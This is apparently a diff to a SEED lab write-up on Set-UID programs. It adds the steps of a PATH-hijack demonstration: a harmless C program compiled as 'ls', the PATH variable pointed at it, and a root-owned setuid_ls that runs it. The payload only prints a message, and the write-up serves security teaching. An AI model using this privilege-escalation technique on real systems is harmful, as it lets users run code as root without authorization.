@@ -268,8 +268,26 @@ We changed the ownership to root and made it a Set-UID program.
 $ sudo chown root setuid_ls
 $ sudo chmod 4755 setuid_ls
 ```
-Then, we created a fake malicious program in '/home/seed/Desktop/fakeMalware' and changed the 'PATH' variable to the fake malware directory.
+Then, we created a fake malicious program in '/home/seed/Desktop/fakeMalware' 
+```
+#include <stdio.h>
+
+int main()
+{
+printf("This is a fake malware \n");
+return 0;
+}
+```
+```
+$ gcc fake.c -o ls
+```
+Then we changed the 'PATH' variable to the fake malware directory.
 ```
 $ export PATH=/home/seed/Desktop/fakeMalware
 ```
-didn't work. //review this
+Finally, we ran the setuid_ls program.
+```
+$ ./setuid_ls
+This is a fake malware 
+```
+As demonstrated, running the Set-UID program executed our malicious 'ls' instead of the expected system command. This is a very serious security vulnerability, because it allows a user to execute arbitrary code with elevated privileges.
